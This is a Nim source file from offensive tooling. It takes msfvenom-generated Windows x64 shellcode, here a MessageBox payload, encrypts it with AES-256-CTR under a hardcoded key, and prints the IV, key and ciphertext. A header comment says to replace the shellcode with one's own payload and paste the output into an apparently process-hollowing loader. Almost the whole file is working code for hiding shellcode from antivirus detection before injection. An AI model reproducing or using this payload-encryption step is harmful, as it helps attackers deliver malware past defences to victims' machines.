#[
    Reference: https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/encrypt_decrypt_bin.nim
    Reference: https://github.com/S3cur3Th1sSh1t/Creds/blob/master/nim/encrypt_shellcode.nim

  - Replace shellcode and envkey below with your generated payload and key
  - Run this program and copy the IV, key, and encrypted shellcode to the matching fields in shellcode_hollow_encrypt.nim

]#

import nimcrypto
import nimcrypto/sysrand
import base64

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

# msfvenom -p windows/x64/messagebox -f csharp
var shellcode: array[293, byte] = [
  byte 0xfc,0x48,0x81,0xe4,0xf0,0xff,
  0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
  0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
  0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,
  0x50,0x3e,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,
  0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,
  0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,0x48,0x8b,0x52,
  0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,
  0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,
  0x3e,0x8b,0x48,0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
  0xe3,0x5c,0x48,0xff,0xc9,0x3e,0x41,0x8b,0x34,0x88,0x48,0x01,
  0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,
  0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,
  0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,
  0x49,0x01,0xd0,0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,
  0x40,0x1c,0x49,0x01,0xd0,0x3e,0x41,0x8b,0x04,0x88,0x48,0x01,
  0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
  0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
  0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,
  0x49,0xc7,0xc1,0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0xfe,
  0x00,0x00,0x00,0x3e,0x4c,0x8d,0x85,0x0d,0x01,0x00,0x00,0x48,
  0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,0xd5,0x48,0x31,
  0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x46,0x6c,0x69,
  0x6b,0x6b,0x20,0x77,0x61,0x73,0x20,0x68,0x65,0x72,0x65,0x00,
  0x4d,0x65,0x73,0x73,0x61,0x67,0x65,0x42,0x6f,0x78,0x00]


var
  data: seq[byte] = toByteSeq(encode(shellcode))
  envkey: string = "flikk"

  ectx, dctx: CTR[aes256]
  key: array[aes256.sizeKey, byte]
  iv: array[aes256.sizeBlock, byte]
  plaintext = newSeq[byte](len(data))
  enctext = newSeq[byte](len(data))
  dectext = newSeq[byte](len(data))

# Create Random IV
discard randomBytes(addr iv[0], 16)

# We do not need to pad data, `CTR` mode works byte by byte.
copyMem(addr plaintext[0], addr data[0], len(data))

# Expand key to 32 bytes using SHA256 as the KDF
var expandedkey = sha256.digest(envkey)
copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))


ectx.init(key, iv)
ectx.encrypt(plaintext, enctext)
ectx.clear()

# dctx.init(key, iv)
# dctx.decrypt(enctext, dectext)
# dctx.clear()

echo "IV: ", toHex(iv)
echo "KEY: ", expandedkey
echo "PLAINTEXT: ", toHex(plaintext)
echo "ENCRYPTED TEXT: ", toHex(enctext)
#echo "DECRYPTED TEXT: ", toHex(dectext)